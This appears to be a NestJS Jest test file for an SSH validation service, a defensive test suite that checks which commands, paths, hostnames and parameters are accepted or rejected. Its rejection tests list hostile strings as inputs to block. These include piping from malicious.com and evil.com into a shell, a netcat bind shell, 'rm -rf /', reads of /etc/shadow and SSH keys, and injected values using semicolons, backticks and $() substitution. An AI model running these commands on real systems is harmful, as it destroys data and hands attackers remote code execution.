import { Test, TestingModule } from '@nestjs/testing';
import { SSHValidationService } from './ssh-validation.service';
import { SSHValidationError } from '../exceptions/ssh.exceptions';

describe('SSHValidationService', () => {
  let service: SSHValidationService;

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [SSHValidationService],
    }).compile();

    service = module.get<SSHValidationService>(SSHValidationService);
  });

  describe('validateCommand', () => {
    it('should accept safe commands', () => {
      const safeCommands = [
        'ls -la',
        'cat /var/log/apache2/access.log',
        'grep error /var/log/application.log',
        'find /home/user -name "*.txt"',
        'ps aux',
        'df -h',
        'free -m',
        'uptime',
        'whoami',
        'wp core version',
        'php -v',
        'mysql --version',
        'apache2ctl status',
        'nginx -t',
        'systemctl status apache2',
      ];

      safeCommands.forEach(command => {
        expect(() => service.validateCommand(command)).not.toThrow();
        const result = service.validateCommand(command);
        expect(result).toBe(command);
      });
    });

    it('should reject dangerous commands', () => {
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /var',
        'wget http://malicious.com/script.sh | sh',
        'curl -s http://evil.com | bash',
        'echo "malicious" > /etc/passwd',
        'chmod 777 /etc/shadow',
        'usermod -a -G sudo attacker',
        'nc -l -p 4444 -e /bin/sh',
        'ls; rm -rf /',
        'ls && malicious',
        'ls || evil',
        'ls | sh',
        'ls `evil`',
        'ls $(evil)',
        'kill -9 1',
        'killall -9 apache2',
        'mount /dev/sda1 /mnt',
        'apt install malware',
        'yum install backdoor',
        'pip install malicious-package',
      ];

      dangerousCommands.forEach(command => {
        expect(() => service.validateCommand(command)).toThrow(SSHValidationError);
      });
    });

    it('should reject empty or invalid commands', () => {
      const invalidCommands = [
        '',
        '   ',
        null,
        undefined,
        'a'.repeat(5000), // Too long
      ];

      invalidCommands.forEach(command => {
        expect(() => service.validateCommand(command as any)).toThrow(SSHValidationError);
      });
    });

    it('should reject commands not in allowed list', () => {
      const disallowedCommands = [
        'unknown-command',
        'malicious-binary',
        'custom-script',
        '/bin/unknown',
      ];

      disallowedCommands.forEach(command => {
        expect(() => service.validateCommand(command)).toThrow(SSHValidationError);
        expect(() => service.validateCommand(command)).toThrow(/not in the allowed command list/);
      });
    });
  });

  describe('validatePath', () => {
    it('should accept safe paths', () => {
      const safePaths = [
        '/var/log/apache2/access.log',
        '/home/user/document.txt',
        '/tmp/backup.tar.gz',
        '/etc/nginx/nginx.conf',
        '/var/www/html/index.php',
        'relative/path/file.txt',
      ];

      safePaths.forEach(path => {
        expect(() => service.validatePath(path)).not.toThrow();
        const result = service.validatePath(path);
        expect(result).toBe(path.replace(/\/+/g, '/')); // Normalized
      });
    });

    it('should reject dangerous paths', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '/dev/null',
        '/proc/self/mem',
        '/sys/kernel/debug',
        '/root/.ssh/id_rsa',
        '/home/user/.ssh/authorized_keys',
        '//etc//passwd',
        '/etc/shadow',
        '/etc/sudoers',
        '/var/../etc/passwd',
      ];

      dangerousPaths.forEach(path => {
        expect(() => service.validatePath(path)).toThrow(SSHValidationError);
      });
    });

    it('should reject empty or invalid paths', () => {
      const invalidPaths = [
        '',
        '   ',
        null,
        undefined,
        'a'.repeat(5000), // Too long
      ];

      invalidPaths.forEach(path => {
        expect(() => service.validatePath(path as any)).toThrow(SSHValidationError);
      });
    });

    it('should normalize paths by removing double slashes', () => {
      const pathsToNormalize = [
        { input: '/var//log//apache2//access.log', expected: '/var/log/apache2/access.log' },
        { input: '//tmp//file.txt', expected: '/tmp/file.txt' },
        { input: '/home///user////document.txt', expected: '/home/user/document.txt' },
      ];

      pathsToNormalize.forEach(({ input, expected }) => {
        const result = service.validatePath(input);
        expect(result).toBe(expected);
      });
    });
  });

  describe('validateHostname', () => {
    it('should accept valid hostnames', () => {
      const validHostnames = [
        'example.com',
        'subdomain.example.com',
        'test-server.local',
        'server01.company.org',
        'api.service.io',
        '192.168.1.100',
        'localhost',
      ];

      validHostnames.forEach(hostname => {
        expect(() => service.validateHostname(hostname)).not.toThrow();
        const result = service.validateHostname(hostname);
        expect(result).toBe(hostname.toLowerCase());
      });
    });

    it('should reject invalid hostnames', () => {
      const invalidHostnames = [
        '',
        '   ',
        null,
        undefined,
        'hostname with spaces',
        'hostname_with_underscores',
        'hostname..double.dot',
        '.hostname.starting.with.dot',
        'hostname.ending.with.dot.',
        'a'.repeat(300), // Too long
        'hostname-',
        '-hostname',
      ];

      invalidHostnames.forEach(hostname => {
        expect(() => service.validateHostname(hostname as any)).toThrow(SSHValidationError);
      });
    });

    it('should convert hostname to lowercase', () => {
      const mixedCaseHostnames = [
        { input: 'EXAMPLE.COM', expected: 'example.com' },
        { input: 'SubDomain.Example.COM', expected: 'subdomain.example.com' },
        { input: 'TEST-Server.LOCAL', expected: 'test-server.local' },
      ];

      mixedCaseHostnames.forEach(({ input, expected }) => {
        const result = service.validateHostname(input);
        expect(result).toBe(expected);
      });
    });
  });

  describe('validatePort', () => {
    it('should accept valid port numbers', () => {
      const validPorts = [1, 22, 80, 443, 3306, 5432, 8080, 65535];

      validPorts.forEach(port => {
        expect(() => service.validatePort(port)).not.toThrow();
        const result = service.validatePort(port);
        expect(result).toBe(port);
      });
    });

    it('should reject invalid port numbers', () => {
      // Test the ones that should be rejected
      [0, -1, 65536, 100000, NaN, Infinity, -Infinity].forEach(port => {
        expect(() => service.validatePort(port as any)).toThrow(SSHValidationError);
      });

      // Test string inputs
      expect(() => service.validatePort('22' as any)).toThrow(SSHValidationError);
      expect(() => service.validatePort(null as any)).toThrow(SSHValidationError);
      expect(() => service.validatePort(undefined as any)).toThrow(SSHValidationError);
    });

    it('should floor decimal numbers', () => {
      const decimalPorts = [
        { input: 22.7, expected: 22 },
        { input: 80.9, expected: 80 },
        { input: 443.1, expected: 443 },
      ];

      decimalPorts.forEach(({ input, expected }) => {
        const result = service.validatePort(input);
        expect(result).toBe(expected);
      });
    });
  });

  describe('validateUsername', () => {
    it('should accept valid usernames', () => {
      const validUsernames = [
        'user',
        'testuser',
        'user123',
        'web-user',
        'app_user',
        '_system',
        'user-name',
        'a',
        'u'.repeat(32), // Max length
      ];

      validUsernames.forEach(username => {
        expect(() => service.validateUsername(username)).not.toThrow();
        const result = service.validateUsername(username);
        expect(result).toBe(username);
      });
    });

    it('should reject invalid usernames', () => {
      const invalidUsernames = [
        '',
        '   ',
        null,
        undefined,
        '123user', // Cannot start with number
        '-user', // Cannot start with dash
        'user name', // Cannot contain spaces
        'user@domain', // Cannot contain @
        'user.name', // Cannot contain dot
        'u'.repeat(33), // Too long
        'USER', // Uppercase not allowed
      ];

      invalidUsernames.forEach(username => {
        expect(() => service.validateUsername(username as any)).toThrow(SSHValidationError);
      });
    });
  });

  describe('sanitizeTemplateParameters', () => {
    it('should sanitize parameter values', () => {
      const parameters = {
        directory: '/var/log',
        filename: 'access.log',
        pattern: 'error; rm -rf /',
        malicious: 'value`evil`',
        injection: 'test$(malicious)',
      };

      const result = service.sanitizeTemplateParameters(parameters);

      expect(result['directory']).toBe('/var/log');
      expect(result['filename']).toBe('access.log');
      expect(result['pattern']).toBe('error rm -rf /'); // Dangerous chars removed
      expect(result['malicious']).toBe('valueevil'); // Backticks removed
      expect(result['injection']).toBe('testmalicious'); // $() removed
    });

    it('should reject invalid parameter keys', () => {
      const invalidParameters = {
        '123invalid': 'value',
        'key-with-dash': 'value',
        'key with space': 'value',
        'key.with.dot': 'value',
      };

      Object.entries(invalidParameters).forEach(([key, value]) => {
        expect(() => service.sanitizeTemplateParameters({ [key]: value })).toThrow(SSHValidationError);
      });
    });

    it('should limit parameter value length', () => {
      const longValue = 'a'.repeat(300);
      const parameters = { key: longValue };

      const result = service.sanitizeTemplateParameters(parameters);

      expect(result['key']).toBe(longValue.substring(0, 256));
    });
  });

  describe('createSafeTemplate', () => {
    it('should create safe commands from templates', () => {
      const templates = [
        {
          template: 'ls {{directory}}',
          parameters: { directory: '/var/log' },
          expected: 'ls /var/log',
        },
        {
          template: 'cat {{filename}}',
          parameters: { filename: 'access.log' },
          expected: 'cat access.log',
        },
        {
          template: 'grep {{pattern}} {{file}}',
          parameters: { pattern: 'error', file: '/var/log/app.log' },
          expected: 'grep error /var/log/app.log',
        },
      ];

      templates.forEach(({ template, parameters, expected }) => {
        const result = service.createSafeTemplate(template, parameters);
        expect(result).toBe(expected);
      });
    });

    it('should sanitize dangerous parameters', () => {
      const template = 'ls {{directory}}';
      const parameters = { directory: '/var/log; echo dangerous' };

      const result = service.createSafeTemplate(template, parameters);

      // The semicolon should be removed during sanitization
      expect(result).toBe('ls /var/log echo dangerous');
      expect(result).not.toContain(';');
    });

    it('should reject invalid templates', () => {
      const invalidTemplates = [
        '',
        null,
        undefined,
        'rm -rf {{directory}}', // Dangerous base command
      ];

      invalidTemplates.forEach(template => {
        expect(() => service.createSafeTemplate(template as any, {})).toThrow();
      });
    });
  });

  describe('validateEnvironmentVariables', () => {
    it('should accept valid environment variables', () => {
      const validEnv = {
        PATH: '/usr/bin:/bin',
        HOME: '/home/user',
        USER: 'testuser',
        LANG: 'en_US.UTF-8',
        TZ: 'UTC',
      };

      const result = service.validateEnvironmentVariables(validEnv);

      expect(result).toEqual(validEnv);
    });

    it('should sanitize dangerous environment variable values', () => {
      const dangerousEnv = {
        PATH: '/usr/bin; rm -rf /',
        COMMAND: 'ls | sh',
        INJECTION: 'value`evil`',
        SUBSTITUTION: 'test$(malicious)',
      };

      const result = service.validateEnvironmentVariables(dangerousEnv);

      expect(result['PATH']).toBe('/usr/bin rm -rf /'); // Semicolon removed
      expect(result['COMMAND']).toBe('ls  sh'); // Pipe removed
      expect(result['INJECTION']).toBe('valueevil'); // Backticks removed
      expect(result['SUBSTITUTION']).toBe('testmalicious'); // $() removed
    });

    it('should reject invalid environment variable names', () => {
      const invalidEnvNames = {
        '123INVALID': 'value',
        'VAR-WITH-DASH': 'value',
        'var with space': 'value',
        'var.with.dot': 'value',
      };

      Object.entries(invalidEnvNames).forEach(([key, value]) => {
        expect(() => service.validateEnvironmentVariables({ [key]: value })).toThrow(SSHValidationError);
      });
    });

    it('should limit environment variable value length', () => {
      const longValue = 'a'.repeat(2000);
      const env = { LONG_VAR: longValue };

      const result = service.validateEnvironmentVariables(env);

      expect(result['LONG_VAR']).toBe(longValue.substring(0, 1024));
    });
  });
});